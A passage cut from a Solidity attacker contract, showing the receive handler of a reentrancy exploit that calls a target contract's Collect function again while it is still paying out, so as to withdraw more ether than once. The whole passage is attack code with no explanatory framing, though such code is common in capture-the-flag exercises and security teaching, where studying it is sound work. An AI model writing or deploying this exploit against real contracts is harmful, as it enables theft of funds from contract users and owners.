            reentered = true;
            target.Collect(msg.value);
        }
    }
    receive() external payable {
        if (!reentered && msg.sender == address(target.LogFile()) && address(target).balance >= msg.value) {
            reentered = true;
            target.Collect(msg.value);
        }
    }
